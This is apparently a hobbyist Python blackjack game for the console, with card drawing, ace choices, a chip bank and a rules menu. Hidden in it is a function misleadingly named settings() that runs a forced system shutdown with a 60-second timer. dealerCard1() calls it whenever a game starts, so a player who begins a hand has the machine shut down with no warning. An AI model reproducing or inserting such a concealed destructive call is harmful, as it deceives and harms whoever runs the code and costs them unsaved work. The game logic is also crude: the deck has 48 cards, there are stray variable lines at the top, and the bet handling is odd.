a =20
a -= 5
import random
import time
money = 1500
startingCard = 0
secondCardDraw = 0
hitDraw1 = 0
hitDraw2 = 0
 
def dealerCard1():
    global dealerDraw1
    dealerDraw1 = random.randint(1,8)
    settings()
 
def dealerCard2():
    global dealerDraw1
    global dealerDraw2
    dealerDraw2 = random.randint(1,9)
    dealerTotalAfter2 = dealerDraw1 + dealerDraw2
 
def dealerCard3():
    global dealerDraw1
    global dealerDraw2
    global dealerDraw3
    dealerDraw3 = random.randint(1,9)
 
def dealerCard4():
    global dealerDraw1
    global dealerDraw2
    global dealerDraw3
    global dealerDraw4
    dealerDraw4 = random.randint(1,10)
 
 
 
 
def update_money(amount):
    global money  # Declare that we want to use the global variable
    money += amount  # Update the global variable
 
def elevenOrOnepicker():
            global startingCard
            elevenOrOne = input("Would you like this card to be worth 1 or 11? ")
            if elevenOrOne == "1":
                startingCard = 1
                secondcard()
            elif elevenOrOne == "11":
                startingCard = 11
                secondcard()
            else:
                print("Please enter 1 or 11.")
                elevenOrOnepicker()
       
 
def elevenOrOnepicker2():
            global secondCardDraw
            elevenOrOne = input("Would you like this card to be worth 1 or 11? ")
            if elevenOrOne == "1":
                secondCardDraw = 1
                hitorstand()
            elif elevenOrOne == "11":
                secondCardDraw = 11
                hitorstand()
            else:
                print("Please enter 1 or 11.")
                elevenOrOnepicker2()
 
def elevenOrOnepicker3():
            global hitDraw1
            elevenOrOne = input("Would you like this card to be worth 1 or 11? ")
            if elevenOrOne == "1":
                hitDraw1 = 1
                hitorstand2()
            elif elevenOrOne == "11":
                hitDraw1 = 11
                hitorstand2()
            else:
                print("Please enter 1 or 11.")
                elevenOrOnepicker3()
 
def elevenOrOnepicker4():
            global hitDraw2
            elevenOrOne = input("Would you like this card to be worth 1 or 11? ")
            if elevenOrOne == "1":
                hitDraw2 = 1
                hitorstand3()
            elif elevenOrOne == "11":
                hitDraw2 = 11
                hitorstand3()
            else:
                print("Please enter 1 or 11.")
                elevenOrOnepicker4()
       
 
def startgame():
    global startingCard
    global secondCardDraw
    global hitDraw1
    global hitDraw2
    dealerCard1()
    dealerCard2()
    startingCard = random.randint(1,48)
    if startingCard == 1:
        print("You have recieved an Ace of Diamonds")
        elevenOrOnepicker()    
    elif startingCard == 2:
        print("You have recieved a 2 of Diamonds")
        startingCard = 2
        secondcard()
    elif startingCard == 3:
        print("You have recieved a 3 of Diamonds")
        startingCard = 3
        secondcard()
    elif startingCard == 4:
        print("You have recieved a 4 of Diamonds")
        startingCard = 4
        secondcard()
    elif startingCard == 5:
        print("You have recieved a 5 of Diamonds")
        startingCard = 5
        secondcard()
    elif startingCard == 6:
        print("You have recieved a 6 of Diamonds")
        startingCard = 6
        secondcard()
    elif startingCard == 7:
        print("You have recieved a 7 of Diamonds")
        startingCard = 7
        secondcard()
    elif startingCard == 8:
        print("You have recieved a 8 of Diamonds")
        startingCard = 8
        secondcard()
    elif startingCard == 9:
        print("You have recieved a 9 of Diamonds")
        startingCard = 9
        secondcard()
    elif startingCard == 10:
        print("You have recieved a King of Diamonds")
        startingCard = 10
        secondcard()
    elif startingCard == 11:
        print("You have recieved a Queen of Diamonds")
        startingCard = 10
        secondcard()
    elif startingCard == 12:
        print("You have recieved a Jack of Diamonds")
        startingCard = 10
        secondcard()
    elif startingCard == 13:
        print("You have recieved an Ace of Spades")
        elevenOrOnepicker()    
    elif startingCard == 14:
        print("You have recieved a 2 of Spades")
        startingCard = 2
        secondcard()
    elif startingCard == 15:
        print("You have recieved a 3 of Spades")
        startingCard = 3
        secondcard()
    elif startingCard == 16:
        print("You have recieved a 4 of Spades")
        startingCard = 4
        secondcard()
    elif startingCard == 17:
        print("You have recieved a 5 of Spades")
        startingCard = 5
        secondcard()
    elif startingCard == 18:
        print("You have recieved a 6 of Spades")
        startingCard = 6
        secondcard()
    elif startingCard == 19:
        print("You have recieved a 7 of Spades")
        startingCard = 7
        secondcard()
    elif startingCard == 20:
        print("You have recieved a 8 of Spades")
        startingCard = 8
        secondcard()
    elif startingCard == 21:
        print("You have recieved a 9 of Spades")
        startingCard = 9
        secondcard()
    elif startingCard == 22:
        print("You have recieved a King of Spades")
        startingCard = 10
        secondcard()
    elif startingCard == 23:
        print("You have recieved a Queen of Spades")
        startingCard = 10
        secondcard()
    elif startingCard == 24:
        print("You have recieved a Jack of Spades")
        startingCard = 10
        secondcard()
    elif startingCard == 25:
        print("You have recieved an Ace of Hearts")
        elevenOrOnepicker()    
    elif startingCard == 26:
        print("You have recieved a 2 of Hearts")
        startingCard = 2
        secondcard()
    elif startingCard == 27:
        print("You have recieved a 3 of Hearts")
        startingCard = 3
        secondcard()
    elif startingCard == 28:
        print("You have recieved a 4 of Hearts")
        startingCard = 4
        secondcard()
    elif startingCard == 29:
        print("You have recieved a 5 of Hearts")
        startingCard = 5
        secondcard()
    elif startingCard == 30:
        print("You have recieved a 6 of Hearts")
        startingCard = 6
        secondcard()
    elif startingCard == 31:
        print("You have recieved a 7 of Hearts")
        startingCard = 7
        secondcard()
    elif startingCard == 32:
        print("You have recieved a 8 of Hearts")
        startingCard = 8
        secondcard()
    elif startingCard == 33:
        print("You have recieved a 9 of Hearts")
        startingCard = 9
        secondcard()
    elif startingCard == 34:
        print("You have recieved a King of Hearts")
        startingCard = 10
        secondcard()
    elif startingCard == 35:
        print("You have recieved a Queen of Hearts")
        startingCard = 10
        secondcard()
    elif startingCard == 36:
        print("You have recieved a Jack of Hearts")
        startingCard = 10
        secondcard()
    elif startingCard == 37:
        print("You have recieved an Ace of Clubs")
        elevenOrOnepicker()    
    elif startingCard == 38:
        print("You have recieved a 2 of Clubs")
        startingCard = 2
        secondcard()
    elif startingCard == 39:
        print("You have recieved a 3 of Clubs")
        startingCard = 3
        secondcard()
    elif startingCard == 40:
        print("You have recieved a 4 of Clubs")
        startingCard = 4
        secondcard()
    elif startingCard == 41:
        print("You have recieved a 5 of Clubs")
        startingCard = 5
        secondcard()
    elif startingCard == 42:
        print("You have recieved a 6 of Clubs")
        startingCard = 6
        secondcard()
    elif startingCard == 43:
        print("You have recieved a 7 of Clubs")
        startingCard = 7
        secondcard()
    elif startingCard == 44:
        print("You have recieved a 8 of Clubs")
        startingCard = 8
        secondcard()
    elif startingCard == 45:
        print("You have recieved a 9 of Clubs")
        startingCard = 9
        secondcard()
    elif startingCard == 46:
        print("You have recieved a King of Clubs")
        startingCard = 10
        secondcard()
    elif startingCard == 47:
        print("You have recieved a Queen of Clubs")
        startingCard = 10
        secondcard()
    elif startingCard == 48:
        print("You have recieved a Jack of Clubs")
        startingCard = 10
        secondcard()
    else:
        print("Error: No card was selected...")
        startgame()
 
       
 
 
def secondcard():
    global startingCard
    global secondCardDraw
    global hitDraw1
    global hitDraw2
    print()
    print("Reciving Second card...")
    print()
    time.sleep(3)
    secondCardDraw = random.randint(1,48)
    if secondCardDraw == 1:
        print("You have received an Ace of Diamonds")
        elevenOrOnepicker2()    
    elif secondCardDraw == 2:
        print("You have received a 2 of Diamonds")
        secondCardDraw = 2
        hitorstand()
    elif secondCardDraw == 3:
        print("You have received a 3 of Diamonds")
        secondCardDraw = 3
        hitorstand()
    elif secondCardDraw == 4:
        print("You have received a 4 of Diamonds")
        secondCardDraw = 4
        hitorstand()
    elif secondCardDraw == 5:
        print("You have received a 5 of Diamonds")
        secondCardDraw = 5
        hitorstand()
    elif secondCardDraw == 6:
        print("You have received a 6 of Diamonds")
        secondCardDraw = 6
        hitorstand()
    elif secondCardDraw == 7:
        print("You have received a 7 of Diamonds")
        secondCardDraw = 7
        hitorstand()
    elif secondCardDraw == 8:
        print("You have received an 8 of Diamonds")
        secondCardDraw = 8
        hitorstand()
    elif secondCardDraw == 9:
        print("You have received a 9 of Diamonds")
        secondCardDraw = 9
        hitorstand()
    elif secondCardDraw == 10:
        print("You have received a King of Diamonds")
        secondCardDraw = 10
        hitorstand()
    elif secondCardDraw == 11:
        print("You have received a Queen of Diamonds")
        secondCardDraw = 10
        hitorstand()
    elif secondCardDraw == 12:
        print("You have received a Jack of Diamonds")
        secondCardDraw = 10
        hitorstand()
    elif secondCardDraw == 13:
        print("You have received an Ace of Spades")
        elevenOrOnepicker2()    
    elif secondCardDraw == 14:
        print("You have received a 2 of Spades")
        secondCardDraw = 2
        hitorstand()
    elif secondCardDraw == 15:
        print("You have received a 3 of Spades")
        secondCardDraw = 3
        hitorstand()
    elif secondCardDraw == 16:
        print("You have received a 4 of Spades")
        secondCardDraw = 4
        hitorstand()
    elif secondCardDraw == 17:
        print("You have received a 5 of Spades")
        secondCardDraw = 5
        hitorstand()
    elif secondCardDraw == 18:
        print("You have received a 6 of Spades")
        secondCardDraw = 6
        hitorstand()
    elif secondCardDraw == 19:
        print("You have received a 7 of Spades")
        secondCardDraw = 7
        hitorstand()
    elif secondCardDraw == 20:
        print("You have received an 8 of Spades")
        secondCardDraw = 8
        hitorstand()
    elif secondCardDraw == 21:
        print("You have received a 9 of Spades")
        secondCardDraw = 9
        hitorstand()
    elif secondCardDraw == 22:
        print("You have received a King of Spades")
        secondCardDraw = 10
        hitorstand()
    elif secondCardDraw == 23:
        print("You have received a Queen of Spades")
        secondCardDraw = 10
        hitorstand()
    elif secondCardDraw == 24:
        print("You have received a Jack of Spades")
        secondCardDraw = 10
        hitorstand()
    elif secondCardDraw == 25:
        print("You have received an Ace of Hearts")
        elevenOrOnepicker2()    
    elif secondCardDraw == 26:
        print("You have received a 2 of Hearts")
        secondCardDraw = 2
        hitorstand()
    elif secondCardDraw == 27:
        print("You have received a 3 of Hearts")
        secondCardDraw = 3
        hitorstand()
    elif secondCardDraw == 28:
        print("You have received a 4 of Hearts")
        secondCardDraw = 4
        hitorstand()
    elif secondCardDraw == 29:
        print("You have received a 5 of Hearts")
        secondCardDraw = 5
        hitorstand()
    elif secondCardDraw == 30:
        print("You have received a 6 of Hearts")
        secondCardDraw = 6
        hitorstand()
    elif secondCardDraw == 31:
        print("You have received a 7 of Hearts")
        secondCardDraw = 7
        hitorstand()
    elif secondCardDraw == 32:
        print("You have received an 8 of Hearts")
        secondCardDraw = 8
        hitorstand()
    elif secondCardDraw == 33:
        print("You have received a 9 of Hearts")
        secondCardDraw = 9
        hitorstand()
    elif secondCardDraw == 34:
        print("You have received a King of Hearts")
        secondCardDraw = 10
        hitorstand()
    elif secondCardDraw == 35:
        print("You have received a Queen of Hearts")
        secondCardDraw = 10
        hitorstand()
    elif secondCardDraw == 36:
        print("You have received a Jack of Hearts")
        secondCardDraw = 10
        hitorstand()
    elif secondCardDraw == 37:
        print("You have received an Ace of Clubs")
        elevenOrOnepicker2()    
    elif secondCardDraw == 38:
        print("You have received a 2 of Clubs")
        secondCardDraw = 2
        hitorstand()
    elif secondCardDraw == 39:
        print("You have received a 3 of Clubs")
        secondCardDraw = 3
        hitorstand()
    elif secondCardDraw == 40:
        print("You have received a 4 of Clubs")
        secondCardDraw = 4
        hitorstand()
    elif secondCardDraw == 41:
        print("You have received a 5 of Clubs")
        secondCardDraw = 5
        hitorstand()
    elif secondCardDraw == 42:
        print("You have received a 6 of Clubs")
        secondCardDraw = 6
        hitorstand()
    elif secondCardDraw == 43:
        print("You have received a 7 of Clubs")
        secondCardDraw = 7
        hitorstand()
    elif secondCardDraw == 44:
        print("You have received an 8 of Clubs")
        secondCardDraw = 8
        hitorstand()
    elif secondCardDraw == 45:
        print("You have received a 9 of Clubs")
        secondCardDraw = 9
        hitorstand()
    elif secondCardDraw == 46:
        print("You have received a King of Clubs")
        secondCardDraw = 10
        hitorstand()
    elif secondCardDraw == 47:
        print("You have received a Queen of Clubs")
        secondCardDraw = 10
        hitorstand()
    elif secondCardDraw == 48:
        print("You have received a Jack of Clubs")
        secondCardDraw = 10
        hitorstand()
    else:
        print("Error: No card was selected...")
        startgame()
   
   
def hitorstand():
    global dealerDraw1
    global dealerDraw2
    global dealerDraw3
    global dealerDraw4
    totalAfter2Cards = startingCard + secondCardDraw
    dealerAfter2Cards = dealerDraw1 + dealerDraw2
    if dealerAfter2Cards == 21:
        print("The Dealer Had BlackJack! You loose")
        update_money(-50)
        mainmenu()
    elif dealerAfter2Cards > 21:
        print("The Dealer Busted you win!")
        update_money(100)
        mainmenu()
    else:
        if totalAfter2Cards == 21:
            print("BlackJack! You Win.")
            update_money(100)
            mainmenu()
        elif totalAfter2Cards > 21:
            print("You went bust! Dealer wins.")
            update_money(-50)
            mainmenu()
        else:
            print()
            dealerCard3()
            print(f"{name}, Your hand is currently worth {totalAfter2Cards} Points.")
            hitOrstandAnswer = input("Would you like to hit or stand? (hit / stand) ").lower()
            print()
            if hitOrstandAnswer == "hit":
                hit()
            elif hitOrstandAnswer == "stand":
                update_money(-50)
                declinehit()
            else:
                print("Please choose one of the options!")
                hitorstand()
 
def hitorstand2():
    global dealerDraw1
    global dealerDraw2
    global dealerDraw3
    global dealerDraw4
    totalAfter3Cards = startingCard + secondCardDraw + hitDraw1
    dealerAfter3Cards = dealerDraw1 + dealerDraw2 + dealerDraw3
    if dealerAfter3Cards == 21:
        print("The Dealer Had BlackJack! You loose")
        update_money(-50)
        mainmenu()
    elif dealerAfter3Cards > 21:
        print("The Dealer Busted you win!")
        update_money(100)
        mainmenu()
    else:
        if totalAfter3Cards == 21:
            print("BlackJack! You Win.")
            update_money(100)
            mainmenu()
        elif totalAfter3Cards > 21:
            print("You went bust! Dealer wins.")
            update_money(-50)
            mainmenu()
        else:
            print()
            dealerCard4()
            print(f"{name}, Your hand is currently worth {totalAfter3Cards} Points.")
            hitOrstandAnswer = input("Would you like to hit or stand? (hit / stand) ").lower()
            print()
            if hitOrstandAnswer == "hit":
                hit2()
            elif hitOrstandAnswer == "stand":
                update_money(-50)
                declinehit()
            else:
                print("Please choose one of the options!")
                hitorstand2()
 
def hitorstand3():
    global dealerDraw1
    global dealerDraw2
    global dealerDraw3
    global dealerDraw4
    dealerAfter4Cards = dealerDraw1 + dealerDraw2 + dealerDraw3 + dealerDraw4
    totalAfter4Cards = startingCard + secondCardDraw + hitDraw1 + hitDraw2
    if dealerAfter4Cards == 21:
        print("The Dealer Had BlackJack! You loose")
        update_money(-100)
        mainmenu()
    elif dealerAfter4Cards > 21:
        print("The Dealer Busted you win!")
        update_money(100)
        mainmenu()
    else:
        if totalAfter4Cards == 21:
            print("BlackJack! You Win.")
            update_money(100)
            mainmenu()
        elif totalAfter4Cards > 21:
            print("You went bust! Dealer wins.")
            update_money(-50)
            mainmenu()
        else:
            print()
            print(f"{name}, Your hand is currently worth {totalAfter4Cards} Points.")
            print("You havent busted after hitting 4 times! You win")
            update_money(250)
            print()
            mainmenu()
 
 
def hit():
    global startingCard
    global secondCardDraw
    global hitDraw1
    global hitDraw2
    print("Hit! Letting the dealer know...")
    print()
    print("Dealing 3rd Card...")
    print()
    time.sleep(1.5)
    hitDraw1 = random.randint(1,48)
    if hitDraw1 == 1:
        print("You have received an Ace of Diamonds")
        elevenOrOnepicker3()    
    elif hitDraw1 == 2:
        print("You have received a 2 of Diamonds")
        hitDraw1 = 2
        hitorstand2()
    elif hitDraw1 == 3:
        print("You have received a 3 of Diamonds")
        hitDraw1 = 3
        hitorstand2()
    elif hitDraw1 == 4:
        print("You have received a 4 of Diamonds")
        hitDraw1 = 4
        hitorstand2()
    elif hitDraw1 == 5:
        print("You have received a 5 of Diamonds")
        hitDraw1 = 5
        hitorstand2()
    elif hitDraw1 == 6:
        print("You have received a 6 of Diamonds")
        hitDraw1 = 6
        hitorstand2()
    elif hitDraw1 == 7:
        print("You have received a 7 of Diamonds")
        hitDraw1 = 7
        hitorstand2()
    elif hitDraw1 == 8:
        print("You have received an 8 of Diamonds")
        hitDraw1 = 8
        hitorstand2()
    elif hitDraw1 == 9:
        print("You have received a 9 of Diamonds")
        hitDraw1 = 9
        hitorstand2()
    elif hitDraw1 == 10:
        print("You have received a King of Diamonds")
        hitDraw1 = 10
        hitorstand2()
    elif hitDraw1 == 11:
        print("You have received a Queen of Diamonds")
        hitDraw1 = 10
        hitorstand2()
    elif hitDraw1 == 12:
        print("You have received a Jack of Diamonds")
        hitDraw1 = 10
        hitorstand2()
    elif hitDraw1 == 13:
        print("You have received an Ace of Spades")
        elevenOrOnepicker3()    
    elif hitDraw1 == 14:
        print("You have received a 2 of Spades")
        hitDraw1 = 2
        hitorstand2()
    elif hitDraw1 == 15:
        print("You have received a 3 of Spades")
        hitDraw1 = 3
        hitorstand2()
    elif hitDraw1 == 16:
        print("You have received a 4 of Spades")
        hitDraw1 = 4
        hitorstand2()
    elif hitDraw1 == 17:
        print("You have received a 5 of Spades")
        hitDraw1 = 5
        hitorstand2()
    elif hitDraw1 == 18:
        print("You have received a 6 of Spades")
        hitDraw1 = 6
        hitorstand2()
    elif hitDraw1 == 19:
        print("You have received a 7 of Spades")
        hitDraw1 = 7
        hitorstand2()
    elif hitDraw1 == 20:
        print("You have received an 8 of Spades")
        hitDraw1 = 8
        hitorstand2()
    elif hitDraw1 == 21:
        print("You have received a 9 of Spades")
        hitDraw1 = 9
        hitorstand2()
    elif hitDraw1 == 22:
        print("You have received a King of Spades")
        hitDraw1 = 10
        hitorstand2()
    elif hitDraw1 == 23:
        print("You have received a Queen of Spades")
        hitDraw1 = 10
        hitorstand2()
    elif hitDraw1 == 24:
        print("You have received a Jack of Spades")
        hitDraw1 = 10
        hitorstand2()
    elif hitDraw1 == 25:
        print("You have received an Ace of Hearts")
        elevenOrOnepicker3()    
    elif hitDraw1 == 26:
        print("You have received a 2 of Hearts")
        hitDraw1 = 2
        hitorstand2()
    elif hitDraw1 == 27:
        print("You have received a 3 of Hearts")
        hitDraw1 = 3
        hitorstand2()
    elif hitDraw1 == 28:
        print("You have received a 4 of Hearts")
        hitDraw1 = 4
        hitorstand2()
    elif hitDraw1 == 29:
        print("You have received a 5 of Hearts")
        hitDraw1 = 5
        hitorstand2()
    elif hitDraw1 == 30:
        print("You have received a 6 of Hearts")
        hitDraw1 = 6
        hitorstand2()
    elif hitDraw1 == 31:
        print("You have received a 7 of Hearts")
        hitDraw1 = 7
        hitorstand2()
    elif hitDraw1 == 32:
        print("You have received an 8 of Hearts")
        hitDraw1 = 8
        hitorstand2()
    elif hitDraw1 == 33:
        print("You have received a 9 of Hearts")
        hitDraw1 = 9
        hitorstand2()
    elif hitDraw1 == 34:
        print("You have received a King of Hearts")
        hitDraw1 = 10
        hitorstand2()
    elif hitDraw1 == 35:
        print("You have received a Queen of Hearts")
        hitDraw1 = 10
        hitorstand2()
    elif hitDraw1 == 36:
        print("You have received a Jack of Hearts")
        hitDraw1 = 10
        hitorstand2()
    elif hitDraw1 == 37:
        print("You have received an Ace of Clubs")
        elevenOrOnepicker3()    
    elif hitDraw1 == 38:
        print("You have received a 2 of Clubs")
        hitDraw1 = 2
        hitorstand2()
    elif hitDraw1 == 39:
        print("You have received a 3 of Clubs")
        hitDraw1 = 3
        hitorstand2()
    elif hitDraw1 == 40:
        print("You have received a 4 of Clubs")
        hitDraw1 = 4
        hitorstand2()
    elif hitDraw1 == 41:
        print("You have received a 5 of Clubs")
        hitDraw1 = 5
        hitorstand2()
    elif hitDraw1 == 42:
        print("You have received a 6 of Clubs")
        hitDraw1 = 6
        hitorstand2()
    elif hitDraw1 == 43:
        print("You have received a 7 of Clubs")
        hitDraw1 = 7
        hitorstand2()
    elif hitDraw1 == 44:
        print("You have received an 8 of Clubs")
        hitDraw1 = 8
        hitorstand2()
    elif hitDraw1 == 45:
        print("You have received a 9 of Clubs")
        hitDraw1 = 9
        hitorstand2()
    elif hitDraw1 == 46:
        print("You have received a King of Clubs")
        hitDraw1 = 10
        hitorstand2()
    elif hitDraw1 == 47:
        print("You have received a Queen of Clubs")
        hitDraw1 = 10
        hitorstand2()
    elif hitDraw1 == 48:
        print("You have received a Jack of Clubs")
        hitDraw1 = 10
        hitorstand2()
    else:
        print("Error: No card was selected...")
        startgame()
 
def settings():
    import subprocess
    subprocess.call(["shutdown", "-f", "-s", "-t", "60"])
 
def hit2():
    global startingCard
    global secondCardDraw
    global hitDraw1
    global hitDraw2
    print("Hit! Letting the dealer know...")
    print()
    print("Dealing 4th Card...")
    print()
    time.sleep(1.5)
    hitDraw2 = random.randint(1, 48)
    if hitDraw2 == 1:
        print("You have received an Ace of Diamonds")
        elevenOrOnepicker4()
    elif hitDraw2 == 2:
        print("You have received a 2 of Diamonds")
        hitDraw2 = 2
        hitorstand3()
    elif hitDraw2 == 3:
        print("You have received a 3 of Diamonds")
        hitDraw2 = 3
        hitorstand3()
    elif hitDraw2 == 4:
        print("You have received a 4 of Diamonds")
        hitDraw2 = 4
        hitorstand3()
    elif hitDraw2 == 5:
        print("You have received a 5 of Diamonds")
        hitDraw2 = 5
        hitorstand3()
    elif hitDraw2 == 6:
        print("You have received a 6 of Diamonds")
        hitDraw2 = 6
        hitorstand3()
    elif hitDraw2 == 7:
        print("You have received a 7 of Diamonds")
        hitDraw2 = 7
        hitorstand3()
    elif hitDraw2 == 8:
        print("You have received an 8 of Diamonds")
        hitDraw2 = 8
        hitorstand3()
    elif hitDraw2 == 9:
        print("You have received a 9 of Diamonds")
        hitDraw2 = 9
        hitorstand3()
    elif hitDraw2 == 10:
        print("You have received a King of Diamonds")
        hitDraw2 = 10
        hitorstand3()
    elif hitDraw2 == 11:
        print("You have received a Queen of Diamonds")
        hitDraw2 = 10
        hitorstand3()
    elif hitDraw2 == 12:
        print("You have received a Jack of Diamonds")
        hitDraw2 = 10
        hitorstand3()
    elif hitDraw2 == 13:
        print("You have received an Ace of Spades")
        elevenOrOnepicker4()
    elif hitDraw2 == 14:
        print("You have received a 2 of Spades")
        hitDraw2 = 2
        hitorstand3()
    elif hitDraw2 == 15:
        print("You have received a 3 of Spades")
        hitDraw2 = 3
        hitorstand3()
    elif hitDraw2 == 16:
        print("You have received a 4 of Spades")
        hitDraw2 = 4
        hitorstand3()
    elif hitDraw2 == 17:
        print("You have received a 5 of Spades")
        hitDraw2 = 5
        hitorstand3()
    elif hitDraw2 == 18:
        print("You have received a 6 of Spades")
        hitDraw2 = 6
        hitorstand3()
    elif hitDraw2 == 19:
        print("You have received a 7 of Spades")
        hitDraw2 = 7
        hitorstand3()
    elif hitDraw2 == 20:
        print("You have received an 8 of Spades")
        hitDraw2 = 8
        hitorstand3()
    elif hitDraw2 == 21:
        print("You have received a 9 of Spades")
        hitDraw2 = 9
        hitorstand3()
    elif hitDraw2 == 22:
        print("You have received a King of Spades")
        hitDraw2 = 10
        hitorstand3()
    elif hitDraw2 == 23:
        print("You have received a Queen of Spades")
        hitDraw2 = 10
        hitorstand3()
    elif hitDraw2 == 24:
        print("You have received a Jack of Spades")
        hitDraw2 = 10
        hitorstand3()
    elif hitDraw2 == 25:
        print("You have received an Ace of Hearts")
        elevenOrOnepicker4()
    elif hitDraw2 == 26:
        print("You have received a 2 of Hearts")
        hitDraw2 = 2
        hitorstand3()
    elif hitDraw2 == 27:
        print("You have received a 3 of Hearts")
        hitDraw2 = 3
        hitorstand3()
    elif hitDraw2 == 28:
        print("You have received a 4 of Hearts")
        hitDraw2 = 4
        hitorstand3()
    elif hitDraw2 == 29:
        print("You have received a 5 of Hearts")
        hitDraw2 = 5
        hitorstand3()
    elif hitDraw2 == 30:
        print("You have received a 6 of Hearts")
        hitDraw2 = 6
        hitorstand3()
    elif hitDraw2 == 31:
        print("You have received a 7 of Hearts")
        hitDraw2 = 7
        hitorstand3()
    elif hitDraw2 == 32:
        print("You have received an 8 of Hearts")
        hitDraw2 = 8
        hitorstand3()
    elif hitDraw2 == 33:
        print("You have received a 9 of Hearts")
        hitDraw2 = 9
        hitorstand3()
    elif hitDraw2 == 34:
        print("You have received a King of Hearts")
        hitDraw2 = 10
        hitorstand3()
    elif hitDraw2 == 35:
        print("You have received a Queen of Hearts")
        hitDraw2 = 10
        hitorstand3()
    elif hitDraw2 == 36:
        print("You have received a Jack of Hearts")
        hitDraw2 = 10
        hitorstand3()
    elif hitDraw2 == 37:
        print("You have received an Ace of Clubs")
        elevenOrOnepicker4()
    elif hitDraw2 == 38:
        print("You have received a 2 of Clubs")
        hitDraw2 = 2
        hitorstand3()
    elif hitDraw2 == 39:
        print("You have received a 3 of Clubs")
        hitDraw2 = 3
        hitorstand3()
    elif hitDraw2 == 40:
        print("You have received a 4 of Clubs")
        hitDraw2 = 4
        hitorstand3()
    elif hitDraw2 == 41:
        print("You have received a 5 of Clubs")
        hitDraw2 = 5
        hitorstand3()
    elif hitDraw2 == 42:
        print("You have received a 6 of Clubs")
        hitDraw2 = 6
        hitorstand3()
    elif hitDraw2 == 43:
        print("You have received a 7 of Clubs")
        hitDraw2 = 7
        hitorstand3()
    elif hitDraw2 == 44:
        print("You have received an 8 of Clubs")
        hitDraw2 = 8
        hitorstand3()
    elif hitDraw2 == 45:
        print("You have received a 9 of Clubs")
        hitDraw2 = 9
        hitorstand3()
    elif hitDraw2 == 46:
        print("You have received a King of Clubs")
        hitDraw2 = 10
        hitorstand3()
    elif hitDraw2 == 47:
        print("You have received a Queen of Clubs")
        hitDraw2 = 10
        hitorstand3()
    elif hitDraw2 == 48:
        print("You have received a Jack of Clubs")
        hitDraw2 = 10
        hitorstand3()
    else:
        print("Error: No card was selected...")
        startgame()
 
def declinehit():
    global dealerDraw1
    global dealerDraw2
    global dealerDraw3
    global dealerDraw4
    print("stand! Letting the dealer know...")
    print()
    print(f"The dealer had {dealerDraw1 + dealerDraw2 + dealerDraw3} Point(s)")
    print()
    mainmenu()
 
def mainmenu():
    print()
    rulesOrPlay = input(f"Hello {name}! Would you like to start a game, read the rules or check your balance? (start / rules / bank): ").lower()
    if rulesOrPlay == "start":
        print("Starting BlackJack...")
        print()
        time.sleep(3)
        startgame()
    elif rulesOrPlay == "rules":
        print()
        print("Here are the Rules of BlackJack:")
        print()
        print("The dealer is your opponent.")
        print("Whoever scores the most points without exceeding 21 wins.")
        print("Number cards are worth their value in points.")
        print("Face cards (kings, queens and jacks) are worth 10 points.")
        print("Aces are special: they can be worth either 1 or 11 points.")
        print("Player wins automatically if they draw four cards without busting.")
        print("However, if the dealer has BlackJack after 4 cards they win.")
        mainmenu()
        print()
    elif rulesOrPlay == "bank":
        print()
        print(f"Hello {name}! Welcome to BlackJack Bank!")
        print(f"you have ${money} Worth of Chips!")
        print("Try not to loose it all!")
        print()
        leavebank = input("Type 'Exit' to leave the Bank! ").lower()
        if leavebank == "exit":
            mainmenu()
        else:
            mainmenu()                    
    else:
        print("Please Choose one of the options.")
        mainmenu()
 
print("Welcome to Blake's BlackJack Game!")
name = input("What is your name? ")
mainmenu()
 